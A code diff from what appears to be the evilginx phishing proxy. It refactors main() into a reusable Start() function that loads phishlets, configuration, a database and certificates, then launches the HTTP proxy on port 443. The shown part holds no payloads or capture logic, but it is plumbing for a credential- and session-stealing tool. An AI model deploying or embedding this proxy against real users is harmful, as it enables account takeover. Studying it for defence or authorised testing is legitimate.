@@ -29,74 +29,75 @@ func joinPath(base_path string, rel_path string) string {
 }
 
 func main() {
+	flag.Parse()
+	Start(false, *phishlets_dir, *debug_log, *developer_mode, *cfg_dir)
+}
+
+func Start(run_background bool, phishlets_path string, debug bool, dev bool, config_path string) *core.Terminal {
 	exe_path, _ := os.Executable()
 	exe_dir := filepath.Dir(exe_path)
 
 	core.Banner()
-	flag.Parse()
-	if *phishlets_dir == "" {
-		*phishlets_dir = joinPath(exe_dir, "./phishlets")
-		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
-			*phishlets_dir = "/usr/share/evilginx/phishlets/"
-			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
+	if phishlets_path == "" {
+		phishlets_path = joinPath(exe_dir, "./phishlets")
+		if _, err := os.Stat(phishlets_path); os.IsNotExist(err) {
+			phishlets_path = "/usr/share/evilginx/phishlets/"
+			if _, err := os.Stat(phishlets_path); os.IsNotExist(err) {
 				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
-				return
+				return nil
 			}
 		}
 	}
-	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
-		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
-		return
+	if _, err := os.Stat(phishlets_path); os.IsNotExist(err) {
+		log.Fatal("provided phishlets directory path does not exist: %s", phishlets_path)
+		return nil
 	}
-	log.DebugEnable(*debug_log)
-	if *debug_log {
+	log.Info("loading phishlets from: %s", phishlets_path)
+
+	log.DebugEnable(debug)
+	if debug {
 		log.Info("debug output enabled")
 	}
 
-	phishlets_path := *phishlets_dir
-	log.Info("loading phishlets from: %s", phishlets_path)
-
-	if *cfg_dir == "" {
+	if config_path == "" {
 		usr, err := user.Current()
 		if err != nil {
 			log.Fatal("%v", err)
-			return
+			return nil
 		}
-		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
+		config_path = filepath.Join(usr.HomeDir, ".evilginx")
 	}
-
-	config_path := *cfg_dir
 	log.Info("loading configuration from: %s", config_path)
 
-	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
+	err := os.MkdirAll(config_path, os.FileMode(0700))
 	if err != nil {
 		log.Fatal("%v", err)
-		return
+		return nil
 	}
 
-	crt_path := joinPath(*cfg_dir, "./crt")
+	crt_path := joinPath(config_path, "./crt")
 
 	if err := core.CreateDir(crt_path, 0700); err != nil {
 		log.Fatal("mkdir: %v", err)
-		return
+		return nil
 	}
 
-	cfg, err := core.NewConfig(*cfg_dir, "")
+	cfg, err := core.NewConfig(config_path, "")
 	if err != nil {
 		log.Fatal("config: %v", err)
-		return
+		return nil
 	}
 
-	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
+	db, err := database.NewDatabase(filepath.Join(config_path, "data.db"))
 	if err != nil {
 		log.Fatal("database: %v", err)
-		return
+		return nil
 	}
 
 	files, err := ioutil.ReadDir(phishlets_path)
 	if err != nil {
 		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
-		return
+		return nil
 	}
 	for _, f := range files {
 		if !f.IsDir() {
@@ -126,17 +127,18 @@ func main() {
 	crt_db, err := core.NewCertDb(crt_path, cfg, ns, hs)
 	if err != nil {
 		log.Fatal("certdb: %v", err)
-		return
+		return nil
 	}
 
-	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, *developer_mode)
+	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, dev)
 	hp.Start()
 
-	t, err := core.NewTerminal(cfg, crt_db, db, *developer_mode)
+	t, err := core.NewTerminal(cfg, crt_db, db, dev)
 	if err != nil {
 		log.Fatal("%v", err)
-		return
+		return nil
 	}
 
-	t.DoWork()
+	t.DoWork(run_background)
+	return t
 }
